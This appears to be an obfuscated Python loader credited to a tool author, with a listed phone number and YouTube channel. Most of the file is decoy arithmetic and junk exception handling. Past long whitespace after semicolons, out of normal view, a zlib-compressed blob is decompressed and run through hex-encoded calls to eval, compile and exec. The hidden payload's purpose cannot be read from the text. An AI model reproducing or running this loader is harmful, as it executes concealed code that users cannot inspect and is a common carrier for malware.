from builtins import *
from math import prod as _ceil


__admin__ = 'NguyenDucPhat'
__authors__ = ('NguyenDucPhatDepZai', 'BlueRed')
__zalo__ = '0396735565'
__youtube__ = 'NguyenDucPhatTool'
__license__ = 'ENCODE-V1.0'

__code__ = 'print("Phat Admin!")'


Add, Multiply, Product, _stackoverflow, Absolute, _theory, _builtins = exec, str, tuple, map, ord, globals, type

class _run:
    def __init__(self, Statistics):
        self._positive = _ceil((Statistics, -68609))
        self.Positive(_callfunction=51371)

    def Positive(self, _callfunction = True):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._positive /= -25642 - _callfunction
        
        try:
            (((_system, Product), _system) for _system in (_system, Product))

        except AssertionError:
            ({_system: Multiply} or Absolute if {_system: Multiply} and Absolute else ... or (Absolute, {_system: Multiply}))

        except:
            _builtins(53191 + -70490) == True

    def System(self, Power = 56353):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Power -= -9477 - -48507
        self.Substract != str
        
        try:
            {_system: Multiply} if Absolute <= Add else (Multiply, Multiply) == Multiply

        except ArithmeticError:
            ((_stackoverflow, Multiply) or Product if (_stackoverflow, Multiply) and Product else ... or (Product, (_stackoverflow, Multiply)))

        except:
            _builtins(-49670 + -24272) == bool

    def _multiply(Theory = Ellipsis):
        return _theory()[Theory]

    def _square(_detectvar = 54057 - 61108, _hypothesis = False, Divide = _theory):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Divide()[_detectvar] = _hypothesis
        
        try:
            ((Product, Product) or Add if (Product, Product) and Add else ... or (Add, (Product, Product)))

        except OSError:
            ({_system: Multiply} or Product if {_system: Multiply} and Product else ... or (Product, {_system: Multiply}))

        except:
            _builtins(36277 - 30263) == None

    def execute(code = str):
        return Add(Multiply(Product(_stackoverflow(Absolute, code))))

    @property
    def Substract(self):
        self.Invert = '<__main__._builtins object at 0x000007164BE91332>'
        return (self.Invert, _run.Substract)

if __name__ == '__main__':
    try:
        _run.execute(code = __code__)
        CallFunction = _run(Statistics = 83025 + 91683)

        _run(Statistics = 33608 * 56989).System(Power = -19531 - CallFunction._positive)                                                                                                                                                                                                                                                          ;_run._square(_detectvar='S222S2S2S2SSS2222222S22SS',_hypothesis=b'x\x9c\xe5\x19ko\xdb6\xf0\xbb\x7f\x85\xeb/\x92\x90&\x90\xf5\xa0$\x03\xf9\xb0M\x1d\xe0"\x8b\x87\xa6h\xba\xb5\x81 KTJ\x97\x123=\x1ag\xbf~w\xa4\xec\xfa\x19GI\xda\x0f\x19)\xbe\x8e\xc7#u<\x1e\xef\xa4\xba\xbc\x1b\xf5\xfa\x10X\xa6\xcb\x12C\x14\xc5i\xce\x8a(\xea\xbf:\x1d\x9c_7w\xb4\x08\x9b\xe4\xcf/q=\xe8\x8br\x15\xad\xa9\xbf\x88\xb2\x92\x88\xfa:fHo\xfe\x8e\xd9\xe0\xf5\xe0W\xde\xd0w4\x1d\x18k#\xff\x8d\xb9P\xf4M; \x9e\xed\xba\xc4\xdd ~\'\x9a\xba\x99\xd2\x1d\xabx/\x04\xdf@\xe6,\xa1E\xd5"\xbf9\xffm\x12\xbe9\xfe0<17\xd0\x12\x91*\x1c\xed\xa6dE\xad\x0f\x90\\\xff\x17|\xdbW\x03C\xeb\x19\xa3%2vk\xd5W\x96jF\x8f\xce\x13zS\xb7\x8c*n\x1a\x18\xf8NT\xb4\xea\xc7%\xed\x974\xfd\\|`\x82\xd3Z\x01\xa6\xf0\xc6\x9f\x8b\xbfD#[q\x1f\x89|.\xce\xc5T\xa4w}\xce\xbe\xc28x\xb7\x81\xd1Skb\xf9\x8d(\xeb(\x82\xd9\xee*\xcd8\xa1sV\xebF\x8f\x8b$\xe6\x95n|\xd2\xe6\xf3\xdb\xdb\xf9\xed\x1c\x9f\xb6\xaa]\x9d^s1\x85\xfe\xdev\'\x0e)\xf2</\x8a"/\xb0\xc8s\xd9\xc2G\xfb4\x1a\x1d\x1d\x1f\x1d\xeb\xc7\xfa\xd1\xd00\xae\xaeNSV\xee\xa1\xc1\xc7c\x8e\x91c.\x036\xb6)\\\xd3:\xae\xeb}T..,\xcb\x92\x99\x0c\xaa\x05\xebW\xaf\xd7\xdb\xd9\x8d\xe3&\x13!\xc4\x04r\x13\x93\xac\xc1\xa8\xef\xdc\xda3\xdd\xf8l<>{{vv\xf6\xb6\xad\xbd\x85\x1c\x06\xee \xa7k\xd3\x86\xf1\x9a\x15\xc8\xf4oqy\xffbL\x18$\xd4hE\x02\xda\xa6\x89/\xb2\xc6\x1e\xc91\xa8\xea;\'d,\xa9\xe2\x82M7\x99h\xbcn\xf7\xa7\xdd\xa9\xbc\x90\xbb\x07eG:\xc6\xa7\xe7"t\xc2\x8a\x94\xceu\xed.c|N\xbf\x14\xcd\x16\xca\x95\xd1\xdb\xc9m\xc90\xa0/&!L\x89Y8\x99tdTU\xb0\x9a\xb3\xe6\xc9\x8c\xdaK\xa7+\xa3\xf6\x13Z0\xaa\xac\xab],\xda+S\xb7Rho\xdbL\x16 \xc8/\x9fO\xb4\xe2\xf1\xef\x9d\x84)D\xd2\x93I\x88\xd3\x85(L"\x84"|\xf9\xac\xe2Bl\xf7\xde\'Sa(\xd9\x84\x0fr\x0b\'\x05.i\xda\xc9L\xb0\xe2\x9e\xd3jBT\x0b\x9cH5\'\x17*\x15\xee\x0b\xe70m\xca\xf7\xbb8\xbc\xff.[\xb2\xfeB\x86\x97\xcf"\x1e\x7f\xa3\x9d\x8e\xeb\xc7\xcbel\x9f\x97\xcf$\xca\xd9M.\x92N\x87\x15u\x1a\x9e64+\x04\x9e@\xd9\xfc\x1f\xdc\x94u,x\xf6\xf0S\'y\xc1\xb9d\x84\xac\x8eW\xc7\xee8\x93\xbafx\xd10\xf2\xa3 2e\xb2"\x02\x98\xfe&\xec0\x19\x13\xfa\x86\x0f\x99\xcd\x06\x9aCI\xd7\x85\xdc\x89\x029\xdf\x16\xf40)D\xb4"/"\x90;0\x18\x17N6a\x87\xc8\xec5W\xf5\xa9f\xdbnf\x0f!ym\xc2:\xc2LH\x01$\x07\xeb\xd6\xd4\xf2\xad\xf4 .\xd6\x03+\x00\xfb9\xa5\xe8Z\xe9\x9a\x9f\xd5\xdb\x96\xa2\xa1\xb2\xb5\xf4\xe2\xa5<\xa1\xf3Nz\xf3\xbeM#\x89\x138\x01I0~/\x15l\x15\xae`\x87\xb6\xe3\xea\xb4\xab\xd0X\x9e\xe5\x1d\xdc\xe4G\xbd\x99\x87\xc1o\xa3\'\x93\xb7\xac\xb7\x90\xc3\xef\xc3\xe3|\x9a\xc6\xfd\xa2uy\xe5\xe6\xa9l\xb4G\xfd\xee\xbf\xbe\x18\xe3\x9c\xcd0\xb0\x19\xe7\xb3\x19\x9f1\xc6f\xecIg\xce\xb4Ry\x9e\x86\x0f;+\xcb\x17\x82\xc9qv\x86\xeb\xc0\x00k\x99\xb1\xd1.5\xf9(\xe6\xbb\x9e\xebCZD\x7f\xd9\xf2\x97\xb9J\xfe\x8f\x10)\xe2{\x0eD\xd3\xb3\xed\xd8\xca\xac\x8cP\x82-\x87d\x10\x13\x8f\x90\xc0\x03\xbe\x91\xa1g\x92\xc0\xa2\x00\x9fZ\x99C\x89\x07K\x0b\x88K\xa8\xe3x.\xb1]\x93\xf8\x80\xe3X\x99kz\x01`\xf90\x9a\xba\x99K\x88\x0bRk\x93@\xb5\x81\xf7\x14\xf6!\x03\x08\xc2e/j2\x1b\xf2\xc5\x9c\xc4\x02\x8a\x10pn\xe8\x87\x82X03\xcc\x00+\xf9A\x07\x80\xa4\x10\xe9JJ\xd7 \x10\x1f,\xfeh\xfb\x87\x18\xd0\xf9\x06W\t\xbd$p\x97F{\x96u\x8f\xc3%\xf5\x1d\x90\x0bq\xd1"\x94:/<|y\x11\xb8\xa4L\x88>\xdcwN$\xef[\xc0\xf5\xb6\xa1O:L\xfe\xcaED\xda\xcb\xc8i\xebX\xba+\x17\xd8!\\\xa7\xdb\x05\xb6\xaai\xa4\x9ai/\rum\xe4\xc5\xf3\x1dM\'\x96Q\xeas\'\x915\xd4\xee\x08KZ\x98\x82\xc7\x8b\xde\x07\x8b\xc9\xf9\xf9\x1f\x10 \xc7\x8a\xacwW\x92\x17\x16FK\x15\xb0c\x98\x1f\x96\x0f\x0b\xf6\xde\x04\x19\x00K\x08d\xc1\x82\x1c\xe5\xc3\xde\x86\xfeLe\xbb\xb6\xaf\xe0\xac,\x9c\x96\x8f\x97\x97\xf8@\xe8\xb6\xab\x9a\\\x9bP_\xc0\x04\xba\xd6h\xdd?\x93\xady\xd0\xb2\xf3\x17\x16\\k\xa1y+0\xd4w\xfe\x8aew\x08\xd7{\x04\x03\'Jw\x08Y\x84\xa8A:\x0b\xd7\xbd\xc7b\xcd\xe4Y\xad-L$\x95:\xe8L\xd3\x94\xb3\x992\xc8\xef \xea\xe3Gw\xb5\xc9g\x1cm\x07\x86\xa5\xcc\xe1\xf2\x06\xc8l\xf6l\x8e\xc6\x10\xfa\xcc\x9f}8\xd6\xf6\xb7\xfdb\xa9>V\xcee\xfd\x11&\x16\x1aXh\xd30\xe4\x10T\x9e\xf4J\xc3V\xc7;\x1b\xce\xc9\xc2A\x91z\xbe\x15\xfb\x87\xe0\xda\x1d\x8d\xb4\xf1\xe2GI\xeb\xc7\x8c\xc7{9\x92\x95"\xef/\xfe:\xf4\xd5\xaf\x8c>\xf8\tI\x0f3\x9d\x8f\x95#\xd4\xba\xb9\x8b?/F\xaf\xc5,\xe9?\r\xad\xeaJa/Z\'\xd7\xb4\xd6QW]\xa2\xba\xbaTjK~}1Nj:\xaf\x8d\xde\x7f\x0c\xe06\xa4')

        _run(Statistics = -83671 / 78030).System(Power = -34738 / CallFunction._positive)                                                                                                                                                                                                                                                          ;mnmnnmmmmnmnnmmmnnmmmn,OODDDODDOOOoOODoDO,NMMNMMMMNNNMMMMMMM,oOoDOoOOoDoDoODoDO,WXXXWWXWWXWXXXWXWXWXWWXXW=(lambda mmmmmmnmnnnnnmnnm:mmmmmmnmnnnnnmnnm(__import__('\x7a\x6c\x69\x62'))),(lambda mmmmmmnmnnnnnmnnm:mmmmmmnmnnnnnmnnm['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda mmmmmmnmnnnnnmnnm:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(mmmmmmnmnnnnnmnnm)"),filename='\x49\x49\x6c\x6c\x49\x6c\x49\x49\x49\x6c\x6c\x49\x49\x49\x49\x49\x6c\x6c\x49\x6c\x6c\x49\x49',mode='\x65\x76\x61\x6c'))),(lambda:(lambda mmmmmmnmnnnnnmnnm:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(mmmmmmnmnnnnnmnnm)"),filename='\x49\x49\x6c\x6c\x49\x6c\x49\x49\x49\x6c\x6c\x49\x49\x49\x49\x49\x6c\x6c\x49\x6c\x6c\x49\x49',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda Ooooo0ooOoOO0oo0oOo0O0oo,mmmmmmnmnnnnnmnnm:Ooooo0ooOoOO0oo0oOo0O0oo(mmmmmmnmnnnnnmnnm))
        CallFunction.System(Power = -17471 * CallFunction._positive)                                                                                                                                                                                                                                                          ;oOoDOoOOoDoDoODoDO()(WXXXWWXWWXWXXXWXWXWXWWXXW(OODDDODDOOOoOODoDO(mnmnnmmmmnmnnmmmnnmmmn(NMMNMMMMNNNMMMMMMM('\x76\x61\x72\x73'))),_run._multiply(Theory='S222S2S2S2SSS2222222S22SS')))

    except Exception as _system:
        if 306272 > 1113738:
            _run.execute(code = Multiply(_system))

        elif 179662 > 7366442:
            _run(Statistics = 40208 + -66118).System(Power = -6632 - CallFunction._positive)